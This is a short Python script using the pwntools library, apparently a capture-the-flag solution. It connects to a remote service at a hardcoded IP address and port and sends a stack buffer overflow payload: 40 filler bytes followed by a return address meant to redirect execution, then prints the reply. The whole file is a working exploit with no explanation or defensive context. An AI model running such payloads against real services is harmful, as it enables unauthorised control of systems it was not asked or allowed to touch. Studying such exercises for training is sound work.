from pwn import *

io = remote('194.5.207.56', 7010)

print(io.recv())
payload = b'A'*40+p64(0x00000000004012ec)
io.sendline(payload)
print(io.recvall())
